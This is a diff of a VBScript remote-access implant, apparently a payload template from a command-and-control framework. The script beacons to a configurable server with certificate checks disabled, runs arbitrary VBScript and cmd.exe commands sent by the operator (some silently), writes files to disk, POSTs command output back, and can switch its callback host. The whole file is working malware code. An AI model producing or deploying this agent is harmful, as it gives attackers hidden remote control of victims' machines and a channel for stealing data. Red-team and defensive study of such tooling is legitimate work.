@@ -1,65 +1,107 @@
-Option Explicit
 On Error Resume Next
-Dim Server, Port, XmlHttpReq, StartOfCommand, EndOfCommand, Command, Shell, ExecObj, FsoObj, Break, Result, UUID, StartOfFilePath, StartOfFileContent, FilePath, FileObj, FileContent, MinWait, MaxWait, WaitTime, CallbackRange, CallbackInterval, ValueStart
 Set Shell = CreateObject("WScript.Shell")
-Set FsoObj=CreateObject("Scripting.FileSystemObject")
+Set FsoObj = CreateObject("Scripting.FileSystemObject")
 Break = False
-UUID = "00000000-0000-0000-0000-000000000000"
-Command = ""
-Server = "127.0.0.1"
-Port = "80"
-MinWait = 5000
-MaxWait = 8000
+UUID = "<client_uuid_00000000-0000-0000-0000-000000000000>"
+RequestPath = "<registered_uri_path>"
+Server = "<server_host_name_example.com>"
+Port = "<server_port_443>"
+HttpLabel = "<http_prefix>://"
+MinWait = <min_wait_5000>
+MaxWait = <max_wait_8000>
+UserAgent = "<client_user_agent>"
+Set ExitRe = New RegExp: ExitRe.Pattern = "<EXIT>$"
+Set NopRe = New RegExp: NopRe.Pattern = "<NOP>$"
+Set UuidRe = New RegExp: UuidRe.Pattern = "<SETUUID><UUID:([a-zA-Z0-9]{8}-([a-zA-Z0-9]{4}-){3}[a-zA-Z0-9]{12})>$"
+Set SetCallbackRe = New RegExp: SetCallbackRe.Pattern = "<SETCALLBACK><INTERVAL:(\d+)><RANGE:(\d+)>$"
+Set SetCallbackHostRe = New RegExp: SetCallbackHostRe.Pattern = "<SETCALLBACKHOST><HOST:([^\s>]+)><PORT:(\d+)>$"
+Set ExecVbsRe = New RegExp: ExecVbsRe.Pattern = "<EXECVBS><VBS:(.+)>$"
+Set WriteFileRe = New RegExp: WriteFileRe.Pattern = "<WRITEFILE><FILEPATH:(.+)><FILECONTENT:(.+)>$"
+Set CmdRe = New RegExp: CmdRe.Pattern = "<CMD><CMD:(.+)>$"
+Set SilentCmdRe = New RegExp: SilentCmdRe.Pattern = "<SILENTCMD><CMD:(.+)>$"
+Set NextPathRe = New RegExp: NextPathRe.Pattern = "^<NEXTPATH><PATH:([^\s>]+)>"
+Results = ""
+CallbackCount = 0
+BadResponseCount = 0
+BadResponseLimit = 5
 While Break <> True
     Command = ""
-    Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
-    XmlHttpReq.Open "GET", "http://" & Server & ":" & Port & "/" & Replace(UUID,"-","/"), false
-    XmlHttpReq.Send
-    If InStr(XmlHttpReq.responseText, "COMMAND:") Then
-        StartOfCommand = InStr(XmlHttpReq.responseText, "COMMAND:")+8
-        EndOfCommand = InStr(StartOfCommand, XmlHttpReq.responseText, " ")
-        If EndOfCommand = 0 Then
-            EndOfCommand = Len(XmlHttpReq.responseText)+1
-        End If
-        Command = Mid(XmlHttpReq.responseText, StartOfCommand, EndOfCommand-StartOfCommand)
+    Set XmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    XmlHttpReq.setOption 2, SXH_SERVER_CERT_IGNORE_ALL_SERVER_ERRORS
+    If Len(Results) = 0 Then
+        XmlHttpReq.Open "GET", HttpLabel & Server & ":" & Port & RequestPath, false
+    Else
+        XmlHttpReq.Open "POST", HttpLabel & Server & ":" & Port & RequestPath, false
     End If
-    If Command = "EXIT" Then
+    CallbackCount = CallbackCount + 1
+    XmlHttpReq.setRequestHeader "User-Agent", UserAgent
+    XmlHttpReq.setRequestHeader "_user", UUID
+    XmlHttpReq.setRequestHeader "_x", 2
+    XmlHttpReq.setRequestHeader "_y", CallbackCount
+    If Len(Results) = 0 Then
+        XmlHttpReq.Send
+    Else
+        XmlHttpReq.Send(Results)
+        Results = ""
+    End If
+    Command = XmlHttpReq.responseText
+    Set XmlHttpReq = Nothing
+    If Command = "" Then
+        BadResponseCount = BadResponseCount + 1
+    Else
+        BadResponseCount = 0
+    End If
+    If BadResponseCount >= BadResponseLimit Then
         Break = True
-    ElseIf Command = "SETUUID" Then
-        UUID = Mid(XmlHttpReq.responseText, EndOfCommand+1, 36)
-    ElseIf Command = "SETCALLBACK" Then
-        ValueStart = InStr(EndOfCommand+1, XmlHttpReq.responseText, "INTERVAL:")+9
-        CallbackInterval = Mid(XmlHttpReq.responseText, ValueStart, InStr(ValueStart, XmlHttpReq.responseText, " ")-ValueStart)
-        ValueStart = InStr(ValueStart+1, XmlHttpReq.responseText, "RANGE:")+6
-        CallbackRange = Mid(XmlHttpReq.responseText, ValueStart, Len(XmlHttpReq.responseText)-ValueStart)
-        MinWait = CInt(CallbackInterval) - CInt(CallbackRange)
-        MaxWait = CInt(CallbackInterval) + CInt(CallbackRange)
-    ElseIf Command = "SETCALLBACKHOST" Then
-        ValueStart = InStr(EndOfCommand+1, XmlHttpReq.responseText, "HOST:")+5
-        Server = Mid(XmlHttpReq.responseText, ValueStart, InStr(ValueStart, XmlHttpReq.responseText, " ")-ValueStart)
-        ValueStart = InStr(ValueStart+1, XmlHttpReq.responseText, "PORT:")+5
-        Port = Mid(XmlHttpReq.responseText, ValueStart, Len(XmlHttpReq.responseText)-ValueStart)
-    ElseIf Command = "EXECVBS" Then
-        Execute Mid(XmlHttpReq.responseText, EndOfCommand+1, Len(XmlHttpReq.responseText))
-    ElseIf Command = "WRITEFILE" Then
-        StartOfFilePath = InStr(EndOfCommand+1, XmlHttpReq.responseText, "FILEPATH:")+9
-        StartOfFileContent = InStr(StartOfFilePath, XmlHttpReq.responseText, "FILECONTENT:")+12
-        FilePath = Mid(XmlHttpReq.responseText, StartOfFilePath, (StartOfFileContent-13)-StartOfFilePath)
-        FileContent = Mid(XmlHttpReq.responseText, StartOfFileContent, Len(XmlHttpReq.responseText))
-        Set FileObj = FsoObj.CreateTextFile(FilePath,True)
-        FileObj.Write FileContent
-        FileObj.Close
-    ElseIf Command = "CMD" Then
-        Set ExecObj = Shell.Exec(("C:\Windows\System32\cmd.exe /c " & Mid(XmlHttpReq.responseText, EndOfCommand+1, Len(XmlHttpReq.responseText))))
-        Result = ""
-        Do Until ExecObj.StdOut.AtEndOfStream
-            Result = Result & ExecObj.StdOut.ReadAll()
-        Loop
-        Set XmlHttpReq = WScript.CreateObject("MSXML2.ServerXMLHTTP")
-        XmlHttpReq.Open "POST", "http://" & Server & ":" & Port & "/" & Replace(UUID,"-","/"), false
-        XmlHttpReq.Send(Result)
     End If
-    Randomize
-    WaitTime = Int((MaxWait-MinWait+1)*Rnd+MinWait)
-    WScript.Sleep(WaitTime)
+    If NextPathRe.Test(Command) Then
+        For Each MatchObj in NextPathRe.Execute(Command)
+            RequestPath = MatchObj.Submatches(0)
+        Next
+    End If
+    If ExitRe.Test(Command) Then
+        Break = True
+    ElseIf UuidRe.Test(Command) Then
+        For Each MatchObj in UuidRe.Execute(Command)
+            UUID = MatchObj.Submatches(0)
+        Next
+    ElseIf SetCallbackRe.Test(Command) Then
+        For Each MatchObj in SetCallbackRe.Execute(Command)
+            MinWait = CInt(MatchObj.Submatches(0)) - CInt(MatchObj.Submatches(1))
+            MaxWait = CInt(MatchObj.Submatches(0)) + CInt(MatchObj.Submatches(1))
+        Next
+    ElseIf SetCallbackHostRe.Test(Command) Then
+        For Each MatchObj in SetCallbackHostRe.Execute(Command)
+            Server = MatchObj.Submatches(0)
+            Port = MatchObj.Submatches(1)
+        Next
+    ElseIf ExecVbsRe.Test(Command) Then
+        For Each MatchObj in ExecVbsRe.Execute(Command)
+            Execute MatchObj.Submatches(0)
+        Next
+    ElseIf WriteFileRe.Test(Command) Then
+        For Each MatchObj in WriteFileRe.Execute(Command)
+            Set FileObj = FsoObj.CreateTextFile(MatchObj.Submatches(0),True)
+            FileObj.Write MatchObj.Submatches(1)
+            FileObj.Close
+        Next
+    ElseIf CmdRe.Test(Command) Then
+        For Each MatchObj in CmdRe.Execute(Command)
+            Set ExecObj = Shell.Exec(("C:\Windows\System32\cmd.exe /c " & MatchObj.Submatches(0)))
+            Results = ""
+            Do Until ExecObj.StdOut.AtEndOfStream
+                Results = Results & ExecObj.StdOut.ReadAll()
+            Loop
+        Next
+    ElseIf SilentCmdRe.Test(Command) Then
+        For Each MatchObj in SilentCmdRe.Execute(Command)
+            Shell.Run MatchObj.Submatches(0), 0, True
+        Next
+    ElseIf NopRe.Test(Command) Then
+        Results = ""
+    End If
+    If Len(Results) = 0 And Break = False Then
+        Randomize
+        WScript.Sleep(Int((MaxWait-MinWait+1)*Rnd+MinWait))
+    End If
 Wend
